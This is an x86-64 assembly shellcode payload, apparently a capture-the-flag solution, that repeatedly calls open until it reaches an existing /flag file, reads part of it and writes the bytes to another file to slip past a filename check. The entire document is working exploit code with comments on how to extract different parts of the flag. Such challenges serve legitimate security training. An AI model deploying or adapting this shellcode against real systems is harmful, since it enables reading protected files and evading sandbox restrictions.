[BITS 64]

_open:
mov ebx, 0x1002fc0 ; STACK
mov edi, ebx
add bx, 0x20 ; STACKEND - 0x20
mov r10, qword [rbx]

xor rsi, rsi
xor rdx, rdx
mov dx, 0x1ff ; 0o777

_open_loop:
xor rax, rax
mov al, 2
mov qword [rdi], r10
syscall ; open
cmp al, 0x20
ja _open_loop ; we are calling open in a way in which, if it succeeds, the file was already existing (therefore it is /flag) 

mov rdi, rax
mov rsi, 0x1002d00 ; STACK
mov dl, 16
xor rax, rax
syscall ; read

mov rsp, rsi
add rsp, 8 ; comment this line to get the first part of the flag


; or reuse exit
mov rdx, 0x1ff
mov rsi, 0x241
mov rdi, 0x1002fe0; STACKEND ; change to 0x1002fe1 to test open name check
mov rax, 2
syscall ; open

mov rbp, rax

mov rdi, rax
mov rsi, rsp
mov rdx, 8
mov rax, 1
syscall ; write

mov rdi, rbp
mov rax, 3
syscall ; close


mov rax, 231
mov rdi, 7
syscall ; exit_group

